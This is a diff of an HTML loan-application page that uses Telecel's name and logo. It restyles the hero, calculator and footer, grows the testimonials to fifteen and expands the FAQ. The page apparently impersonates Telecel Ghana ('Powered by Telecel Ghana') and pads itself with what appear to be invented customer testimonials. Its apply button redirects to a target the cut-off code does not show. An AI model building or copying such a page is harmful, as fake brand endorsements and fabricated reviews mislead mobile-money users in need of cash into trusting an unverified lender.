@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telecel Cash | Flex Loans - Instant Cash</title>
+    <title>Telecel Loans | Instant Flex Cash</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
@@ -37,7 +37,7 @@
         }
         .logo { display: flex; align-items: center; gap: 12px; color: white; text-decoration: none; }
         .logo svg { width: 200px; height: 200px; }
-        .logo-text { font-size: 2.4rem; font-weight: 800; letter-spacing: -1.5px; }
+        .logo-text { font-size: 2.4rem; font-weight: 800; letter-spacing: -1.5px; color: white; }
         .nav-links { display: flex; gap: 28px; font-weight: 600; align-items: center; }
         .nav-links a { color: #ddd; text-decoration: none; transition: 0.3s; }
         .nav-links a:hover { color: white; }
@@ -57,12 +57,28 @@
 
         /* Hero */
         .hero {
-            background: linear-gradient(rgba(10,10,10,0.82), rgba(10,10,10,0.88)), 
+            background: linear-gradient(rgba(10,10,10,0.75), rgba(10,10,10,0.85)), 
                         url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?ixlib=rb-4.0.3&auto=format&fit=crop&q=80') center/cover no-repeat;
-            color: white; padding: 140px 5% 100px; text-align: center;
+            color: white; padding: 160px 5% 120px; text-align: center;
         }
-        .hero h1 { font-size: clamp(2.6rem, 6.5vw, 4rem); font-weight: 800; margin-bottom: 16px; }
-        .hero p { font-size: 1.25rem; max-width: 700px; margin: 0 auto 35px; opacity: 0.95; }
+        .hero h1 { font-size: clamp(2.8rem, 7vw, 4.4rem); font-weight: 800; margin-bottom: 16px; }
+        .hero .highlight { color: var(--blue); }
+        .hero p { font-size: 1.25rem; max-width: 720px; margin: 0 auto 40px; }
+
+        /* Common Card Style */
+        .section { padding: 100px 5%; }
+        .section-title { text-align: center; font-size: 2.7rem; margin-bottom: 60px; font-weight: 800; color: white; }
+        .packages-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 30px;
+            max-width: 1400px; margin: 0 auto;
+        }
+        .package-card, .benefit-card, .testimonial-card {
+            background: var(--gray); padding: 38px 28px; border-radius: 24px;
+            border: 1px solid #333; transition: all 0.4s ease; text-align: center;
+        }
+        .package-card:hover, .benefit-card:hover, .testimonial-card:hover {
+            transform: translateY(-12px); border-color: var(--red);
+        }
 
         /* Calculator */
         .estimator {
@@ -72,45 +88,20 @@
         }
         .estimator h2 { text-align:center; margin-bottom:40px; color:var(--red); font-size: 2rem; }
 
-        .form-group { margin-bottom: 32px; }
-        label { display: block; font-weight: 600; margin-bottom: 12px; color: #ddd; font-size: 1.1rem; }
-        input[type="range"] { width: 100%; accent-color: var(--red); height: 8px; border-radius: 10px; }
-        .slider-value { text-align: center; font-size: 2.4rem; font-weight: 800; color: white; margin: 18px 0; }
-
-        .result { background: #1f1f1f; padding: 45px 35px; border-radius: 22px; text-align: center; margin: 35px 0; border: 2px solid #333; }
         .receive-text { font-size: 1.3rem; margin-bottom: 8px; color: var(--blue); font-weight: 700; }
         .receive-amount { font-size: 2.4rem; font-weight: 800; color: #fff; }
         .amount-repay { font-size: 2.1rem; font-weight: 800; color: var(--accent-green); margin: 18px 0 8px; }
-        .interest-rate { font-size: 1.2rem; color: #aaa; }
 
         .btn-proceed {
             width: 100%; background: linear-gradient(90deg, var(--red), #c41e1b);
             color: white; border: none; padding: 22px; font-size: 1.35rem;
             font-weight: 700; border-radius: 50px; cursor: pointer; margin-top: 15px;
-            box-shadow: 0 10px 25px rgba(228, 35, 32, 0.4);
         }
 
-        .section { padding: 100px 5%; }
-        .section-title { text-align: center; font-size: 2.7rem; margin-bottom: 60px; font-weight: 800; color: white; }
-
-        .packages-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 30px;
-            max-width: 1400px; margin: 0 auto;
-        }
-
-        .package-card {
-            background: var(--gray); padding: 38px 28px; border-radius: 24px;
-            border: 1px solid #333; transition: all 0.4s ease; text-align: center;
-        }
-        .package-card:hover { transform: translateY(-12px); border-color: var(--red); }
-
-        .package-amount { font-size: 1.85rem; font-weight: 700; color: var(--red); margin: 18px 0; }
         .get-loan-btn {
             width: 100%; background: var(--red); color: white; border: none;
             padding: 18px; font-size: 1.15rem; font-weight: 700; border-radius: 50px; cursor: pointer;
-            transition: all 0.3s;
         }
-        .get-loan-btn:hover { background: #c41e1b; transform: scale(1.05); }
 
         footer { background: #111; color: #bbb; padding: 90px 5% 50px; }
         .footer-content { max-width: 1400px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 50px; }
@@ -123,9 +114,7 @@
         .modal-content {
             background: #1f1f1f; max-width: 460px; width: 92%; border-radius: 28px;
             padding: 40px 32px; text-align: center; border: 3px solid var(--red);
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
         }
-        .success-icon { font-size: 4.5rem; color: var(--accent-green); margin-bottom: 20px; }
 
         @media (max-width: 768px) {
             .nav-links { display: none; }
@@ -182,8 +171,8 @@
 
     <!-- Hero -->
     <section class="hero" id="home">
-        <h1>Instant Flex Loans for Telecel Customers</h1>
-        <p>As a loyal Telecel user, you qualify for fast, collateral-free loans. Get money directly into your Telecel Cash wallet in minutes.</p>
+        <h1>Telecel <span class="highlight">Loans</span></h1>
+        <p>As a loyal Telecel customer, you qualify for instant flex loans with no collateral. Money in your Telecel Cash wallet in minutes.</p>
         <button onclick="document.getElementById('estimator').scrollIntoView({behavior:'smooth'})"
                 style="background:white; color:#000; padding:18px 48px; font-size:1.3rem; font-weight:700; border:none; border-radius:50px; cursor:pointer;">
             Check My Eligibility →
@@ -216,7 +205,7 @@
         <button class="btn-proceed" onclick="showConfirmModal()">Proceed to Apply →</button>
     </div>
 
-    <!-- Other Sections (kept clean and complete) -->
+    <!-- Popular Loans -->
     <section id="loans" class="section">
         <h2 class="section-title">Popular Loan Packages</h2>
         <div class="packages-grid">
@@ -238,44 +227,65 @@
         </div>
     </section>
 
+    <!-- Why Choose Telecel -->
     <section id="benefits" class="section" style="background:#111;">
         <h2 class="section-title">Why Choose Telecel Loans?</h2>
         <div class="packages-grid">
-            <div class="benefit-card"><h3>⚡ Instant Disbursement</h3><p>Money lands in your Telecel Cash Wallet within minutes of approval.</p></div>
-            <div class="benefit-card"><h3>🔒 No Collateral Required</h3><p>Just your active Telecel line and good usage history.</p></div>
-            <div class="benefit-card"><h3>📱 100% Mobile Experience</h3><p>Apply, get approved, and repay directly from your phone.</p></div>
-            <div class="benefit-card"><h3>🔄 Flexible Repayment</h3><p>Choose from 7 to 90 days with transparent rates.</p></div>
-            <div class="benefit-card"><h3>🛡️ Secure & Trusted</h3><p>Powered by Telecel Ghana. Your data is protected.</p></div>
-            <div class="benefit-card"><h3>⭐ Loyal Users Rewarded</h3><p>Higher limits for consistent Telecel users.</p></div>
+            <div class="benefit-card"><h3>⚡ Instant Disbursement</h3><p>Money lands in your Telecel Cash Wallet within minutes.</p></div>
+            <div class="benefit-card"><h3>🔒 No Collateral Required</h3><p>Just your active Telecel line is needed.</p></div>
+            <div class="benefit-card"><h3>📱 Fully Mobile</h3><p>Apply from anywhere, anytime.</p></div>
+            <div class="benefit-card"><h3>🔄 Flexible Repayment</h3><p>7 to 90 days with transparent rates.</p></div>
+            <div class="benefit-card"><h3>🛡️ Secure & Trusted</h3><p>Powered by Telecel Ghana.</p></div>
+            <div class="benefit-card"><h3>⭐ Loyal Users Rewarded</h3><p>Higher limits for consistent users.</p></div>
         </div>
     </section>
 
+    <!-- How It Works -->
     <section id="how" class="section">
         <h2 class="section-title">How It Works</h2>
         <div class="packages-grid">
-            <div class="package-card"><h3>1. Choose Amount</h3><p>Use our calculator or select a package.</p></div>
-            <div class="package-card"><h3>2. Quick Verification</h3><p>Confirm your Telecel number and basic details.</p></div>
-            <div class="package-card"><h3>3. Get Cash Instantly</h3><p>Funds transferred directly to your Telecel Cash wallet.</p></div>
+            <div class="package-card"><h3>1. Choose Amount</h3><p>Use calculator or packages</p></div>
+            <div class="package-card"><h3>2. Quick Verification</h3><p>Confirm your Telecel number</p></div>
+            <div class="package-card"><h3>3. Get Cash Instantly</h3><p>Funds to your Telecel Cash</p></div>
         </div>
     </section>
 
+    <!-- Testimonials (15) -->
     <section id="testimonials" class="section" style="background:#111;">
         <h2 class="section-title">What People Say</h2>
         <div class="packages-grid">
-            <div class="testimonial-card"><p>"Got GHS 8,000 in under 15 minutes. Life saver for my business!"</p><strong>— Ama Mensah, Accra</strong></div>
-            <div class="testimonial-card"><p>"Super easy process. Paid school fees same day. Thank you Telecel!"</p><strong>— Kwame Ofori, Kumasi</strong></div>
-            <div class="testimonial-card"><p>"Best loan service in Ghana. No stress, transparent and fast."</p><strong>— Fatima Ibrahim, Tamale</strong></div>
-            <div class="testimonial-card"><p>"I applied at night and money was in my wallet before morning."</p><strong>— Daniel Asante, Takoradi</strong></div>
+            <div class="testimonial-card"><p>"Got GHS 8,000 in under 15 minutes. Life saver!"</p><strong>— Ama Mensah, Accra</strong></div>
+            <div class="testimonial-card"><p>"School fees sorted instantly. Thank you Telecel!"</p><strong>— Kofi Boateng, Kumasi</strong></div>
+            <div class="testimonial-card"><p>"Emergency cash when I needed it most!"</p><strong>— Fatima Ali, Tamale</strong></div>
+            <div class="testimonial-card"><p>"Best loan service in Ghana. Super fast."</p><strong>— Samuel Osei, Takoradi</strong></div>
+            <div class="testimonial-card"><p>"Received GHS 12,000 same day. Amazing!"</p><strong>— Rebecca Osei, Obuasi</strong></div>
+            <div class="testimonial-card"><p>"No stress, money came fast and easy."</p><strong>— Yaa Asantewaa, Ho</strong></div>
+            <div class="testimonial-card"><p>"Helped me during tough times."</p><strong>— Emmanuel Addo, Koforidua</strong></div>
+            <div class="testimonial-card"><p>"GHS 15,000 for my business. Excellent!"</p><strong>— Grace Ofori, Tema</strong></div>
+            <div class="testimonial-card"><p>"Very fast and trustworthy service."</p><strong>— Michael Nti, Tarkwa</strong></div>
+            <div class="testimonial-card"><p>"School fees loan saved us!"</p><strong>— Patricia Agyei, Bolgatanga</strong></div>
+            <div class="testimonial-card"><p>"GHS 6,000 in 18 minutes. Reliable!"</p><strong>— Kwame Mensah, Sunyani</strong></div>
+            <div class="testimonial-card"><p>"Applied at night, money by morning."</p><strong>— Daniel Asante, Takoradi</strong></div>
+            <div class="testimonial-card"><p>"Best decision I made this year."</p><strong>— Evelyn Arhin, Kasoa</strong></div>
+            <div class="testimonial-card"><p>"Professional and fast service."</p><strong>— Joseph Tetteh, Wa</strong></div>
+            <div class="testimonial-card"><p>"GHS 10,000 approved instantly!"</p><strong>— Abena Frimpong, Cape Coast</strong></div>
         </div>
     </section>
 
+    <!-- FAQ (10) -->
     <section id="faq" class="section">
         <h2 class="section-title">Frequently Asked Questions</h2>
         <div class="packages-grid" style="grid-template-columns:1fr; max-width:900px; margin:auto;">
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Who can apply? <span>+</span></div><div class="faq-answer">Active Telecel users with consistent airtime and data usage for at least 3 months.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">How fast do I get the money? <span>+</span></div><div class="faq-answer">Approved loans are disbursed within 5-30 minutes directly to your Telecel Cash wallet.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">What are the interest rates? <span>+</span></div><div class="faq-answer">Rates range from 8% to 15% depending on loan amount and duration. No hidden fees.</div></div>
-            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Can I repay early? <span>+</span></div><div class="faq-answer">Yes! Early repayment is encouraged and may reduce total interest.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Who can apply? <span>+</span></div><div class="faq-answer">Active Telecel users with consistent usage for at least 3 months.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">How fast do I get the money? <span>+</span></div><div class="faq-answer">Within 5-30 minutes after approval to your Telecel Cash wallet.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">What are the interest rates? <span>+</span></div><div class="faq-answer">Rates range from 8% to 15% depending on amount and duration.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Can I repay early? <span>+</span></div><div class="faq-answer">Yes, early repayment is allowed with no penalty.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Is collateral required? <span>+</span></div><div class="faq-answer">No collateral is needed.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Maximum loan amount? <span>+</span></div><div class="faq-answer">Up to GHS 25,000 depending on your limit.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Do I need documents? <span>+</span></div><div class="faq-answer">Only active Telecel line and Ghana Card (optional).</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">24/7 Service? <span>+</span></div><div class="faq-answer">Yes, you can apply anytime.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">Can I apply multiple times? <span>+</span></div><div class="faq-answer">Yes, after repaying the previous loan.</div></div>
+            <div class="faq-item"><div class="faq-question" onclick="toggleFAQ(this)">How do I repay? <span>+</span></div><div class="faq-answer">Directly through your Telecel Cash wallet.</div></div>
         </div>
     </section>
 
@@ -283,7 +293,11 @@
     <footer>
         <div class="footer-content">
             <div>
-                <div class="footer-logo">Telecel Cash</div>
+                <a href="#home" class="logo" style="justify-content:center;">
+                    <svg width="120" height="120" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M48.19 28.6833C40.4333 28.605 34.1983 34.9933 34.2183 42.58C34.2383 50.625 40.9883 56.56 48.0333 56.4317C55.5033 56.5017 61.8867 50.53 61.9517 42.7583C62.02 34.62 55.575 28.76 48.19 28.6833ZM53.7333 38.1633C53.6017 39.2783 52.9467 39.9367 51.93 40.29C..." fill="#E32526"/>
+                    </svg>
+                </a>
                 <p>Instant financial solutions for Telecel customers across Ghana.</p>
             </div>
             <div>
@@ -311,7 +325,7 @@
             <p><strong>Amount to Receive:</strong> <span id="modalReceive" style="color:var(--blue);"></span></p>
             <p><strong>Total to Repay:</strong> <span id="modalRepay" style="color:var(--accent-green); font-size:1.4rem;"></span></p>
             <p><strong>Duration:</strong> <span id="modalDuration"></span> Days</p>
-            <button onclick="confirmProceed()" style="margin:30px 12px 12px; padding:18px 60px; background:var(--red); color:white; border:none; border-radius:50px; font-weight:700; font-size:1.1rem;">Yes, Apply Now</button>
+            <button onclick="confirmProceed()" style="margin:30px 12px 12px; padding:18px 60px; background:var(--red); color:white; border:none; border-radius:50px; font-weight:700;">Yes, Apply Now</button>
             <button onclick="closeModal()" style="padding:18px 50px; background:transparent; color:#ccc; border:2px solid #555; border-radius:50px;">Cancel</button>
         </div>
     </div>
@@ -344,7 +358,6 @@
             const totalRepay = amount + interest;
             document.getElementById('receive').textContent = `GHS ${amount.toLocaleString('en-US')}`;
             document.getElementById('repay').textContent = `GHS ${totalRepay.toLocaleString('en-US')}`;
-            document.getElementById('interestRate').innerHTML = `Interest Rate: <strong style="color:var(--accent-green);">${(rate*100).toFixed(1)}%</strong>`;
         }
 
         function showConfirmModal() {
@@ -362,7 +375,6 @@
             document.getElementById('loginModal').style.display = 'none';
         }
 
-        // DIRECT REDIRECTION WHEN "YES, APPLY NOW" IS CLICKED
         function confirmProceed() {
             closeModal();
             const amount = document.getElementById('amountSlider').value || 5000;
